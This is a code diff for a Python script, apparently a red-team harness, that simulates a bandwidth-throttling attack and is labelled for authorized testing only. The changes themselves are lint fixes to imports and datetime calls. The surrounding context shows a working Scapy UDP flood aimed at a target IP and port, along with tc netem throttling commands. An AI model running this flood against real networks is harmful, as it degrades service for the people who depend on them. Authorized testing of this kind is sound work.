@@ -13,9 +13,9 @@ WARNING: Only use with explicit written authorization on isolated test networks.
 import json
 import subprocess
 import sys
-from datetime import datetime, timezone
+from datetime import UTC, datetime
 
-from scapy.all import IP, UDP, Raw, send, RandShort
+from scapy.all import IP, UDP, RandShort, Raw, send
 
 
 def run_cmd(cmd: list[str]) -> dict:
@@ -29,7 +29,7 @@ def run_cmd(cmd: list[str]) -> dict:
 
 def setup_tc_throttle(interface: str, rate: str = "100kbit", latency: str = "200ms") -> dict:
     """Configure tc (traffic control) to throttle bandwidth on an interface."""
-    clear = run_cmd(["tc", "qdisc", "del", "dev", interface, "root"])
+    run_cmd(["tc", "qdisc", "del", "dev", interface, "root"])
     result = run_cmd([
         "tc", "qdisc", "add", "dev", interface, "root", "netem",
         "rate", rate, "delay", latency, "loss", "5%",
@@ -55,14 +55,14 @@ def generate_bandwidth_flood(target_ip: str, target_port: int, packet_count: int
     """Generate controlled bandwidth consumption traffic using Scapy."""
     payload = Raw(load=b"X" * packet_size)
     packets_sent = 0
-    start = datetime.now(timezone.utc)
+    start = datetime.now(UTC)
 
     for _ in range(packet_count):
         pkt = IP(dst=target_ip) / UDP(sport=RandShort(), dport=target_port) / payload
         send(pkt, verbose=False)
         packets_sent += 1
 
-    end = datetime.now(timezone.utc)
+    end = datetime.now(UTC)
     duration = (end - start).total_seconds()
     total_bytes = packets_sent * (packet_size + 42)
 
@@ -96,7 +96,7 @@ def generate_report(baseline: dict, throttle: dict, flood: dict, post_baseline: 
     lines = [
         "BANDWIDTH THROTTLING ATTACK SIMULATION REPORT — AUTHORIZED TESTING ONLY",
         "=" * 70,
-        f"Date: {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M UTC')}",
+        f"Date: {datetime.now(UTC).strftime('%Y-%m-%d %H:%M UTC')}",
         "",
         "BASELINE MEASUREMENT:",
         f"  Bandwidth: {baseline.get('bandwidth_mbps', 'N/A')} Mbps",
